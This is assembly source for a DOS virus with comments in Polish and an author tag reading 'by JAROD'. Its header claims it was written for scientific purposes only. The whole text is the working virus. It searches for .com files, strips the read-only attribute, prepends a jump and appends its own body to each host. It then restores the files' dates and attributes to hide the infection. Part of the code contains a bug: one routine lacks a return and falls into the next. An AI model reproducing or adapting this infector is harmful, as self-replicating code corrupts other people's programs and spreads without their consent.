;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;
;	Lamerski Wirus zarazajacy com-y ,trzeba poprawic
;	zarazanie ,wyszukiwanie, maskowanie i inne bzdety
;	Zostal stworzony tylko i wylacznie w celach naukowych.
;	
;	
;
;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

.model tiny
.code
org 100h
start:
	db 0e9h
	dw 00h
start_virus:
	call here
here:
	pop bp
	sub bp,offset here
	mov di,100h
	push di
	lea si,[offset first_three+bp]
	cld
	movsw
	movsb
	mov ah,30h
	int 21h
	cmp al,2
	jg dos_ok
	mov ah,09h
	lea dx,[offset dos_version+bp]
	int 21h
	jmp quit
dos_ok:
	lea dx,[offset dta+bp]
	call set_dta
	mov ah,4eh
find_next:
	lea dx,[offset template+bp]
	mov cx,7h
	int 21h
	jnc found_one
	jmp quit
found_one:
	xor al,al
	call get_set_attrib
	mov [file_attrib+bp],cx
	test cx,1
je attrib_ok
	dec cx
	mov al,1
	call get_set_attrib
attrib_ok:
	lea dx,[dta+bp+1eh]
	mov ax,3d02h
	int 21h

	jc restore_attrib


	xchg bx,ax
	xor al,al
	call get_set_date
	mov [time+bp],cx
	mov [date+bp],dx
	mov ah,3fh
	lea dx,[first_three+bp]
	mov cx,3
	int 21h
	jc restore_date
	mov ax,word ptr[dta+bp+1ah]
	mov cx,end_virus-start_virus+3
	cmp ax,cx
	jz restore_date
	sub ax,3
	mov word ptr [jmp_offset+bp],ax
	xor al,al
	call move_file_ptr
	mov cx,3
	lea dx,[offset jmp_inst+bp]
	call write_to_file
	jc restore_date
	mov al,2
	call move_file_ptr
	mov cx,end_virus-start_virus
	lea dx,[offset start_virus+bp]
	call write_to_file
restore_date:
	mov al,1
	mov cx,[time+bp]
	mov dx,[date+bp]
	call get_set_date
restore_attrib:
	mov cx,[file_attrib+bp]
	mov al,1
	call get_set_attrib
close_file:
	mov ah,3eh
	int 21h
	mov ah,4fh
	jmp find_next
quit:
	mov dx,80h
	call set_dta
	xor ax,ax
	xor bx,bx
	xor cx,cx
	xor dx,dx
	xor bp,bp
	xor si,si
	xor di,di
	retn

set_dta:
	mov ah,1ah
	int 21h
	retn

get_set_date:
	mov ah,57h
	int 21h
	retn

get_set_attrib:
	lea dx,[offset dta+bp+1eh]
	mov ah,43h
	int 21h

move_file_ptr:
	mov ah,42h
	xor cx,cx
	xor dx,dx
	int 21h
	retn

write_to_file:
	mov ah,40h
	int 21h
	retn

dos_version 	 db 'Nie odpowiednia wersja DOS-a',0ah,0dh,'$'
template	 db '*.com',0
first_three   	 db 0cdh,020h,0
virus_name 	 db 'VIRUS',0
author 		 db 'by JAROD',0
jmp_inst 	 db 0e9h
end_virus 	 equ $
jmp_offset 	 dw ?
dta 		 db 42h dup(?)
date 		 dw ?
time 		 dw ?
file_attrib 	 dw ?

end start